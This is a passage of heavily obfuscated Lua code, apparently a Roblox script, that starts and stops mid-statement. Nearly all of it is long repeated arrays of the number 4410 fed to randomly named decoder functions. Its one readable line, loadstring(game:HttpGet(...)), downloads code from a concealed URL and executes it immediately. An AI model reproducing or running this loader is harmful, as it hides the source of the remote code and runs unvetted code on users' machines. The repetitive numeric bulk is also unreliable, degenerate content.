410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}) 

loadstring(game:HttpGet(xcamiaJJaakFlTJanUOSrTnawvUzLSZtCWkTnxqnI({RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4